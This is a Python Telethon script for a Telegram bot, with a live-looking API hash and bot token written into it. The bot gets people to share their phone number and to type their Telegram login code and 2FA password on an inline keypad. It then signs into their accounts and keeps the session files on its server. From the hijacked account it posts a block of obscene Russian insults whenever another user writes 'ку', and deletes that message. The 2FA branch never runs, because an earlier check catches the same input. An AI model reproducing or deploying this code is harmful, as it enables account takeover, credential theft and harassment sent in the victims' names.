import asyncio
import os
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, SessionPasswordNeededError
from telethon.tl.custom import Button

API_ID = 39163151
API_HASH = '3c0e92ad7b268eca1eb1a33a9baa7d1d'
BOT_TOKEN = '8815552938:AAEj7B8jvLF6jua1_uHzHV_eGgWT9FUvsyw'

SESSION_DIR = "sessions"
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)

bot_client = TelegramClient(os.path.join(SESSION_DIR, 'bot_session'), API_ID, API_HASH).start(bot_token=BOT_TOKEN)

user_client = None
user_auth_data = {}

insults = [
    "я твою мать ебал",
    "я твою мать ебал в жопу",
    "я твою мать ебал в рот",
]

def get_digit_keyboard():
    return [
        [Button.inline("1"), Button.inline("2"), Button.inline("3")],
        [Button.inline("4"), Button.inline("5"), Button.inline("6")],
        [Button.inline("7"), Button.inline("8"), Button.inline("9")],
        [Button.inline("0"), Button.inline("◀️"), Button.inline("✅")]
    ]

def get_clear_keyboard():
    return Button.clear()

@bot_client.on(events.NewMessage)
async def auth_handler(event):
    global user_client
    user_id = event.sender_id
    text = event.raw_text.strip()
    chat_id = event.chat_id

    if chat_id != user_id:
        return

    if text == '/start':
        if user_client and user_client.is_connected():
            await event.reply("✅ Уже авторизован")
            return
        buttons = [[Button.request_phone("📱 Поделиться номером", resize=True)]]
        await event.reply("🔐 Отправь номер", buttons=buttons)
        return

    if event.contact:
        phone = event.contact.phone_number
        if not phone or user_id in user_auth_data:
            return
        session_path = os.path.join(SESSION_DIR, f'user_{user_id}')
        user_client = TelegramClient(session_path, API_ID, API_HASH)
        await user_client.connect()
        try:
            result = await user_client.send_code_request(phone)
            user_auth_data[user_id] = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'temp_input': ''
            }
            await event.reply(f"✅ Код на {phone[-4:]}\n\nВведи код:", buttons=get_digit_keyboard())
        except Exception as e:
            await event.reply(f"❌ {e}")
        return

@bot_client.on(events.CallbackQuery)
async def callback_handler(event):
    global user_client
    user_id = event.sender_id
    data = event.data.decode('utf-8')
    
    if user_id not in user_auth_data:
        await event.answer("Нажми /start", alert=True)
        return
    
    auth = user_auth_data[user_id]
    
    if data == '✅':
        code = auth.get('temp_input', '')
        if len(code) < 3:
            await event.answer("Короткий код", alert=True)
            return
        try:
            await user_client.sign_in(
                phone=auth['phone'],
                code=code,
                phone_code_hash=auth['phone_code_hash']
            )
            del user_auth_data[user_id]
            await event.edit("✅ Авторизован!\n\nТестируй `ку`", buttons=get_clear_keyboard())
            print("✅ АВТОРИЗАЦИЯ УСПЕШНА")
            
            @user_client.on(events.NewMessage)
            async def command_handler(event):
                print(f"📩 user_client получил: {event.raw_text}")
                if event.sender_id == (await user_client.get_me()).id:
                    return
                if event.raw_text.strip() != 'ку':
                    return
                msg = '\n'.join(insults)
                await user_client.send_message(event.chat_id, msg)
                await event.delete()
                print("✅ Оскорбления отправлены")
            
        except SessionPasswordNeededError:
            auth['state'] = 'password_waiting'
            auth['temp_input'] = ''
            await event.edit("🔐 Введи 2FA пароль:", buttons=get_digit_keyboard())
        except Exception as e:
            await event.edit(f"❌ {e}", buttons=get_clear_keyboard())
            del user_auth_data[user_id]
    elif data == '◀️':
        auth['temp_input'] = auth.get('temp_input', '')[:-1]
        display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
        await event.edit(display, buttons=get_digit_keyboard())
    elif data.isdigit():
        auth['temp_input'] = auth.get('temp_input', '') + data
        display = f"Код:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи код:"
        await event.edit(display, buttons=get_digit_keyboard())
    elif auth.get('state') == 'password_waiting':
        if data == '✅':
            pwd = auth.get('temp_input', '')
            if len(pwd) < 1:
                await event.answer("Введи пароль", alert=True)
                return
            try:
                await user_client.sign_in(password=pwd)
                del user_auth_data[user_id]
                await event.edit("✅ Авторизован!\n\nТестируй `ку`", buttons=get_clear_keyboard())
                print("✅ АВТОРИЗАЦИЯ УСПЕШНА (2FA)")
                
                @user_client.on(events.NewMessage)
                async def command_handler(event):
                    print(f"📩 user_client получил: {event.raw_text}")
                    if event.sender_id == (await user_client.get_me()).id:
                        return
                    if event.raw_text.strip() != 'ку':
                        return
                    msg = '\n'.join(insults)
                    await user_client.send_message(event.chat_id, msg)
                    await event.delete()
                    print("✅ Оскорбления отправлены")
                
            except Exception:
                await event.answer("Неверный пароль", alert=True)
                auth['temp_input'] = ''
                await event.edit("🔐 Неверный пароль, попробуй снова:", buttons=get_digit_keyboard())
        elif data == '◀️':
            auth['temp_input'] = auth.get('temp_input', '')[:-1]
            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA:"
            await event.edit(display, buttons=get_digit_keyboard())
        elif data.isdigit():
            auth['temp_input'] = auth.get('temp_input', '') + data
            display = f"Пароль:\n`{auth['temp_input']}`" if auth['temp_input'] else "Введи 2FA:"
            await event.edit(display, buttons=get_digit_keyboard())

async def main():
    await bot_client.start()
    me = await bot_client.get_me()
    print(f'✅ Бот: @{me.username}')
    print('👉 Напиши /start, авторизуй свой аккаунт')
    print('👉 После авторизации напиши `ку` в ЛЮБОМ чате')
    print('👉 Смотри логи Railway — там будет видно, доходит ли команда')
    await bot_client.run_until_disconnected()

with bot_client:
    bot_client.loop.run_until_complete(main())